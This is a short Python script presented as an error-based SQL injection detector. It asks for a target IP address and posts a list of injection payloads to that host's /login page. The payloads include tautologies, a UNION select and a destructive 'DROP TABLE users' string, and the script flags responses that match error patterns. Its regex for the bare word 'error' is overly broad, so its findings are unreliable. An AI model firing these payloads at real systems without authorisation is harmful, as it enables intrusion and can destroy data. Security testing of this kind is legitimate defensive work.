# -*- coding: utf-8 -*-
"""
Created on Fri Feb  21 03:345:47 2025

@author: IAN CARTER KULANI

"""

from colorama import Fore
import pyfiglet
import os
font=pyfiglet.figlet_format("ERROR BASED SQL INJECTION DETECTOR")
print(Fore.GREEN+font)

import requests
import re

# Function to check for Error-Based SQL Injection patterns in the response text
def detect_error_sql_injection(response_text):
    # Patterns indicating potential error messages related to SQL injection
    patterns = [
        r"error",               # Common word indicating an error message
        r"syntax.*error",       # SQL syntax error message
        r"unclosed.*quotation", # Unclosed quotation mark error
        r"mysql.*error",        # MySQL specific errors
        r"Warning.*mysql",      # MySQL warning message
        r"Invalid.*query",      # Invalid query error message
        r"unrecognized.*command", # Unrecognized SQL command error
        r"ORA-00933",           # Oracle SQL error code for syntax issues
    ]
    
    # Check if any of the patterns are found in the response
    for pattern in patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True
    return False

# Function to simulate an HTTP request to check for Error-Based SQL injection
def check_error_sql_injection(ip_address):
    print(f"Checking for potential Error-Based SQL Injection on {ip_address}...")

    # Simulate a form submission with potential Error SQL injection payloads
    payloads = [
        "' OR 1=1--",                 # Common injection pattern
        "' AND 1=1--",                # AND condition injection
        "' OR 'a'='a'--",             # Always true injection
        "'; DROP TABLE users--",     # Attempt to drop a table
        "' UNION SELECT null, null--",# UNION-based injection (to generate error)
        "'; SELECT * FROM users--",  # Select query that might cause errors
    ]

    # Try submitting the payloads to a hypothetical login page or endpoint
    url = f"http://{ip_address}/login"  # Example URL; adjust based on the target application

    for payload in payloads:
        # Example POST request with payload in the 'username' field
        data = {'username': payload, 'password': 'password'}
        try:
            response = requests.post(url, data=data)
            
            if response.status_code == 200:
                # Check the response for signs of Error-Based SQL Injection vulnerability
                if detect_error_sql_injection(response.text):
                    print(f"[!] Potential Error-Based SQL Injection detected with payload: {payload}")
                    print(f"Response from server: {response.text[:200]}")  # Display part of the response
            else:
                print(f"[+] Request failed with status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error making request: {e}")

# Main function
def main():
        
    # Prompt the user for an IP address to test for SQL Injection
    ip_address = input("Enter the target IP address:")
    
    # Start detecting Error SQL Injection attempts
    check_error_sql_injection(ip_address)

if __name__ == "__main__":
    main()
